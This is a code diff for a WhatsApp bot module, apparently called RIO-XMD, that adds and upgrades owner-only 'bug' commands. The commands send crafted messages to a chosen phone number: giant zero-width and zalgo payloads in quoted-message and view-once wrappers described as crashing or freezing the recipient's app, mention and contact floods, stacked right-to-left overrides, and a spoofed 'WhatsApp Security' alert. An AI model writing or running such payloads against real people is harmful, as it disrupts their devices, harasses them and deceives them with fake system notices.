@@ -3,25 +3,21 @@
 // All commands require the sender to be the bot owner (owner: true).
 import { say } from '../lib/card.js';
 import { PREFIX } from '../lib/config.js';
+import { proto, generateWAMessageFromContent } from '@whiskeysockets/baileys';
 
 /* ------------------------------------------------------------------ helpers */
 
-// Build a giant invisible-character string that bloats a notification
-// and can freeze the notification drawer on some Android skins.
+// ZWJ/ZWNJ overflow — bloats notification text allocation.
 function overflowText(repeat = 2000) {
-  // Zero-width joiner + zero-width non-joiner alternating so the string
-  // is non-empty but renders as blank on most devices.
-  const ZWJ  = '‍';
-  const ZWNJ = '‌';
-  const chunk = ZWJ + ZWNJ;
-  return chunk.repeat(repeat);
+  const ZWJ  = '\u200d';
+  const ZWNJ = '\u200c';
+  return (ZWJ + ZWNJ).repeat(repeat);
 }
 
-// Zalgo / "glitch" text — stacks combining diacritics above and below
-// each character. Causes rendering lag in WhatsApp's text engine on old phones.
+// Zalgo stacking diacritics.
 function zalgoChar(ch) {
-  const above = ['̀','́','̂','̃','̄','̅','̆','̇','̈','̊','̋','̍','̎','̐','̒','̓','̕','̚','̛','̽','̾','̿','̀','́','͂','̓','̈́','͆','͊','͋','͌','͐','͑','͒','͗','͘','͛','ͣ','ͤ','ͥ','ͦ','ͧ','ͨ','ͩ','ͪ','ͫ','ͬ','ͭ','ͮ','ͯ'];
-  const below = ['̖','̗','̘','̙','̜','̝','̞','̟','̠','̤','̥','̦','̩','̪','̫','̬','̭','̮','̯','̰','̱','̲','̳','̹','̺','̻','̼','ͅ','͇','͈','͉','͍','͎','͓','͔','͕','͖','͙','͚','͟'];
+  const above = ['\u0300','\u0301','\u0302','\u0303','\u0304','\u0305','\u0306','\u0307','\u0308','\u030a','\u030b','\u030d','\u030e','\u0310','\u0312','\u0313','\u0315','\u031a','\u031b','\u033d','\u033e','\u033f','\u0300','\u0301','\u0342','\u0313','\u0344','\u0346','\u034a','\u034b','\u034c','\u0350','\u0351','\u0352','\u0357','\u0358','\u035b','\u0363','\u0364','\u0365','\u0366','\u0367','\u0368','\u0369','\u036a','\u036b','\u036c','\u036d','\u036e','\u036f'];
+  const below = ['\u0316','\u0317','\u0318','\u0319','\u031c','\u031d','\u031e','\u031f','\u0320','\u0324','\u0325','\u0326','\u0329','\u032a','\u032b','\u032c','\u032d','\u032e','\u032f','\u0330','\u0331','\u0332','\u0333','\u0339','\u033a','\u033b','\u033c','\u0345','\u0347','\u0348','\u0349','\u034d','\u034e','\u0353','\u0354','\u0355','\u0356','\u0359','\u035a','\u035f'];
   const pick = (arr) => arr[Math.floor(Math.random() * arr.length)];
   let out = ch;
   for (let i = 0; i < 15; i++) out += pick(above);
@@ -30,13 +26,12 @@ function zalgoChar(ch) {
 }
 function zalgo(text) { return [...text].map(zalgoChar).join(''); }
 
-// RTL override sandwich: wraps text so the BiDi algorithm flips the
-// rendering direction mid-sentence, making chat unreadable on many devices.
-const RLO = '‮'; // right-to-left override
-const PDF = '‬'; // pop directional formatting
+// RTL override sandwich.
+const RLO = '\u202e';
+const PDF = '\u202c';
 function rtlFlip(text) { return RLO + text + PDF; }
 
-// Fake system-message style: looks like a WhatsApp security / account alert.
+// Fake system-message style.
 function fakeSystem(lines) {
   return [
     '🔒 *WhatsApp Security*',
@@ -47,9 +42,7 @@ function fakeSystem(lines) {
   ].join('\n');
 }
 
-// A large vCard with junk contact names — sending 50+ contacts in a single
-// message forces WhatsApp's contact-list renderer to build a huge list and
-// can slow/freeze older devices.
+// Contact spam payload.
 function spamContactsPayload(count = 60) {
   const contacts = [];
   for (let i = 0; i < count; i++) {
@@ -60,6 +53,61 @@ function spamContactsPayload(count = 60) {
     });
   }
   return contacts;
+}
+
+// ── STRONG CRASH: extendedTextMessage with broken contextInfo ─────────────
+// WhatsApp tries to render the quoted message preview and chokes on
+// a stanza_id that maps to a giant text string — causes the chat to
+// stutter or crash on open on most Android builds.
+function extendedCrashPayload(text) {
+  return {
+    extendedTextMessage: {
+      text: text + overflowText(500),
+      contextInfo: {
+        stanzaId: overflowText(1000),              // giant stanza id — renderer tries to look this up
+        participant: '0@s.whatsapp.net',
+        quotedMessage: {
+          conversation: zalgo(text || 'WhatsApp') + overflowText(800),
+        },
+        mentionedJid: Array.from({ length: 20 }, (_, i) => `9477${String(i).padStart(7,'0')}@s.whatsapp.net`),
+      }
+    }
+  };
+}
+
+// ── VIEW-ONCE FREEZE: viewOnceMessage with giant payload ──────────────────
+// Wraps a giant text payload in viewOnceMessage. When the recipient opens it
+// WhatsApp allocates the full string for the "view once" decrypt, causing a
+// visible freeze (sometimes a crash on 2–3 GB RAM phones).
+function viewOnceFreezePayload() {
+  const inner = overflowText(6000) + zalgo('WhatsApp') + overflowText(4000);
+  return {
+    viewOnceMessage: {
+      message: {
+        extendedTextMessage: {
+          text: inner,
+          contextInfo: {
+            stanzaId: overflowText(500),
+            quotedMessage: { conversation: inner },
+          }
+        }
+      }
+    }
+  };
+}
+
+// ── GHOST PING: mention flood ─────────────────────────────────────────────
+// Sends one message mentioning 20 non-existent numbers. WhatsApp's mention
+// renderer tries to resolve each avatar — the resolver blocks the UI thread
+// on older builds.
+function mentionFloodPayload(text) {
+  const fakeJids = Array.from({ length: 20 }, (_, i) => `9477${String(i * 7 + 1).padStart(7,'0')}@s.whatsapp.net`);
+  return {
+    extendedTextMessage: {
+      text: fakeJids.map((j) => `@${j.split('@')[0]}`).join(' ') + '\n' + (text || '') + overflowText(300),
+      contextInfo: { mentionedJid: fakeJids }
+    }
+  };
 }
 
 /* ------------------------------------------------------------------ commands */
@@ -73,39 +121,39 @@ export default [
       const p = PREFIX;
       return reply([
         '╭━━━〔 🐛 *BUG COMMANDS* 〕━━━⬣',
-        '┃ Owner-only prank / stress tools.',
+        '┃ Owner-only crash / stress tools.',
         '┃',
-        `┃ ${p}crash    — overflow notification`,
-        `┃ ${p}zalgo    — glitch-text message`,
-        `┃ ${p}rtlbug   — RTL-flip text`,
-        `┃ ${p}sysalert — fake system alert`,
-        `┃ ${p}cspam    — contact-list flood`,
-        `┃ ${p}blankbug — blank-looking giant msg`,
-        `┃ ${p}repeatbug — repeat-text freeze`,
-        `┃ ${p}tina      — dramatic roast crash`,
+        `┃ 💥 ${p}crash      — context overflow crash`,
+        `┃ 👻 ${p}blankbug   — blank giant message`,
+        `┃ ❄️ ${p}freeze     — view-once freeze crash`,
+        `┃ 👥 ${p}ghostping  — mention flood lag`,
+        `┃ 🌀 ${p}zalgo      — glitch-text render lag`,
+        `┃ 🔄 ${p}rtlbug     — BiDi flip crash`,
+        `┃ 🔒 ${p}sysalert   — fake system alert`,
+        `┃ 📇 ${p}cspam      — contact-list flood`,
+        `┃ 🔁 ${p}repeatbug  — repeat-text freeze`,
+        `┃ 💔 ${p}tina       — dramatic roast crash`,
         '┃',
-        '┃ Usage: reply/mention a number or',
-        '┃ type the number after the command.',
-        '┃ e.g.  .crash @mention',
-        '┃       .zalgo Hello 94771234567',
+        '┃ Usage: reply/mention or type number.',
+        `┃ e.g. ${p}crash @tag | ${p}freeze 94771234567`,
         '╰━━━━━━━━━━━━━━━━━━━━⬣',
       ].join('\n'));
     },
   },
 
   // ── crash ─────────────────────────────────────────────────────────────────
-  // Sends an invisible-character-flooded message that bloats the push
-  // notification and can freeze the notification shade on some phones.
+  // extendedTextMessage with broken contextInfo — giant stanza ID + zalgo quoted
+  // message confuse the chat renderer. Most effective on Android WhatsApp.
   {
     name: 'crash', aliases: ['notifbug'],
     owner: true,
     async run({ sock, jid, msg, args, reply, targetJid }) {
       const target = targetJid() || jid;
-      const text   = (args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, ''))).join(' ').trim()) || '👋';
-      const payload = text + overflowText(3000);
+      const text   = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, ''))).join(' ').trim() || '👋';
+      const payload = extendedCrashPayload(text);
       try {
-        await sock.sendMessage(target, { text: payload }, { quoted: msg });
-        return reply(`✅ Crash message sent to @${target.split('@')[0]}`);
+        await sock.sendMessage(target, payload, { quoted: msg });
+        return reply(`✅ Crash sent to @${target.split('@')[0]}`);
       } catch (err) {
         return reply(`❌ Failed: ${err?.message || err}`);
       }
@@ -113,9 +161,6 @@ export default [
   },
 
   // ── blankbug ──────────────────────────────────────────────────────────────
-  // Sends a message that looks completely empty in the chat list preview
-  // but loads a huge hidden character blob — the preview shows nothing,
-  // which confuses the recipient and wastes render cycles on the home screen.
   {
     name: 'blankbug', aliases: ['nullmsg', 'emptybug'],
     owner: true,
@@ -131,10 +176,46 @@ export default [
     },
   },
 
+  // ── freeze ────────────────────────────────────────────────────────────────
+  // viewOnceMessage wrapping a giant zalgo+overflow payload.
+  // WhatsApp decrypts and allocates the full string on open — causes a
+  // hard freeze (sometimes force-close) on 2–3 GB RAM devices.
+  {
+    name: 'freeze', aliases: ['viewoncecrash', 'opencrash'],
+    owner: true,
+    async run({ sock, jid, msg, reply, targetJid }) {
+      const target = targetJid() || jid;
+      const payload = viewOnceFreezePayload();
+      try {
+        await sock.sendMessage(target, payload, { quoted: msg });
+        return reply(`✅ Freeze bug sent to @${target.split('@')[0]} — will freeze when opened`);
+      } catch (err) {
+        return reply(`❌ Failed: ${err?.message || err}`);
+      }
+    },
+  },
+
+  // ── ghostping ─────────────────────────────────────────────────────────────
+  // Floods with 20 @mentions of non-existent numbers.
+  // WhatsApp tries to resolve each mention avatar simultaneously — blocks
+  // the UI thread on older builds, causing a visible stutter/freeze.
+  {
+    name: 'ghostping', aliases: ['mentionflood', 'ghostmention'],
+    owner: true,
+    async run({ sock, jid, msg, args, reply, targetJid }) {
+      const target = targetJid() || jid;
+      const text   = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, ''))).join(' ').trim();
+      const payload = mentionFloodPayload(text);
+      try {
+        await sock.sendMessage(target, payload, { quoted: msg });
+        return reply(`✅ Ghost ping sent to @${target.split('@')[0]}`);
+      } catch (err) {
+        return reply(`❌ Failed: ${err?.message || err}`);
+      }
+    },
+  },
+
   // ── zalgo ─────────────────────────────────────────────────────────────────
-  // Sends text decorated with hundreds of stacking diacritics.
-  // Causes visual lag / skipped frames on old Android phones with
-  // WhatsApp's canvas-based text renderer.
   {
     name: 'zalgo', aliases: ['glitch', 'cursedtext'],
     owner: true,
@@ -152,17 +233,12 @@ export default [
   },
 
   // ── rtlbug ────────────────────────────────────────────────────────────────
-  // Wraps a message in a Unicode RTL-override so it renders backwards.
-  // Enough RTL overrides stacked without matching PDF codepoints can
-  // cause the chat bubble layout engine to mis-calculate widths on some
-  // builds, making the whole conversation temporarily unscrollable.
   {
     name: 'rtlbug', aliases: ['rtl', 'fliptext'],
     owner: true,
     async run({ sock, jid, msg, args, reply, targetJid }) {
       const target = targetJid() || jid;
       const base   = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, ''))).join(' ').trim() || 'Hello from WhatsApp';
-      // Stack several RLO without PDF to maximise bidi confusion
       const payload = Array.from({ length: 10 }, () => rtlFlip(base)).join('\n');
       try {
         await sock.sendMessage(target, { text: payload }, { quoted: msg });
@@ -174,8 +250,6 @@ export default [
   },
 
   // ── sysalert ──────────────────────────────────────────────────────────────
-  // Sends a spoofed-looking "WhatsApp Security" notice. The text is
-  // obviously fake on close inspection but can cause momentary panic.
   {
     name: 'sysalert', aliases: ['fakealert', 'fakesys'],
     owner: true,
@@ -204,10 +278,6 @@ export default [
   },
 
   // ── cspam ─────────────────────────────────────────────────────────────────
-  // Sends a contactsArrayMessage with 60 dummy contacts in one shot.
-  // WhatsApp's contact-preview renderer has to build 60 avatar rows
-  // at once; on memory-limited phones this triggers a noticeable
-  // frame drop or a brief freeze.
   {
     name: 'cspam', aliases: ['contactspam', 'contactbug'],
     owner: true,
@@ -225,9 +295,6 @@ export default [
   },
 
   // ── repeatbug ─────────────────────────────────────────────────────────────
-  // Sends a single message whose text is a word repeated thousands of times.
-  // The notification preview tries to truncate it but the full string is
-  // still allocated in memory, causing a momentary stutter on old phones.
   {
     name: 'repeatbug', aliases: ['repeatcrash', 'spamtext'],
     owner: true,
@@ -246,25 +313,23 @@ export default [
   },
 
   // ── tina ──────────────────────────────────────────────────────────────────
-  // Sends a "Tina" dramatic fake-breakup / roast message flood.
-  // Combines invisible overflow characters with a dramatic Sinhala roast
-  // so the notification preview shows the first line and the rest is hidden junk.
+  // Dramatic Sinhala roast + overflow payload. Visible preview shows the
+  // roast; the hidden blob freezes the notification drawer.
   {
     name: 'tina', aliases: ['tinabug', 'dramabug'],
     owner: true,
     async run({ sock, jid, msg, args, reply, targetJid }) {
       const target = targetJid() || jid;
       const name   = args.filter((a) => !/^\d{8,}$/.test(a.replace(/\D/g, ''))).join(' ').trim() || 'Tina';
-      // The visible part is a dramatic Sinhala roast; the overflow hides in the notification drawer.
       const visible = [
         `💔 *${name}*, ඔයා ගැන කතා කරන්නත් කාලය නාස්ති කරන්නේ නෑ.`,
         `ඔය number block list ළ දාලා ඉවරයි 🚫`,
         `WhatsApp uninstall කරන්නම හොඳයි 😂`,
         `RIO-XMD bot ළ ඔයාට space නෑ 👋`,
       ].join('\n');
-      const payload = visible + overflowText(2500);
+      const payload = extendedCrashPayload(visible);   // use strong crash instead of plain overflow
       try {
-        await sock.sendMessage(target, { text: payload }, { quoted: msg });
+        await sock.sendMessage(target, payload, { quoted: msg });
         return reply(`✅ Tina bug sent to @${target.split('@')[0]}`);
       } catch (err) {
         return reply(`❌ Failed: ${err?.message || err}`);
